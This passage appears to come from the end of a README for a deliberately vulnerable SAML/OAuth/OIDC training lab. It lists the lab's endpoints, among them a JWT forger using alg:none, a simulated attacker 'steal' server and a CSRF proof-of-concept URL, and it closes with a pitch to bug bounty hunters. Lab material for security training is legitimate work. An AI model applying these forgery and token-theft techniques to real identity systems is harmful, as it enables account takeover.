|-------------|---------|
| `GET /saml/metadata` | IdP SAML metadata |
| `GET /saml/cert` | IdP signing certificate |
| `GET /.well-known/openid-configuration` | OIDC discovery |
| `GET /oauth/jwks` | JSON Web Key Set |
| `POST /capture` | Debug: returns decoded SAMLResponse |
| `GET /lab6/forge?email=X&role=Y` | Forge JWT with alg:none |
| `GET /lab5/steal` | Simulated attacker server |
| `GET /lab4/csrf_poc` | CSRF attack PoC URL |

---

*Built for elite bug bounty hunters. These vulnerabilities are responsible for millions of dollars in bounties paid by Google, Microsoft, Uber, GitHub, Shopify, HackerOne, and many more.*
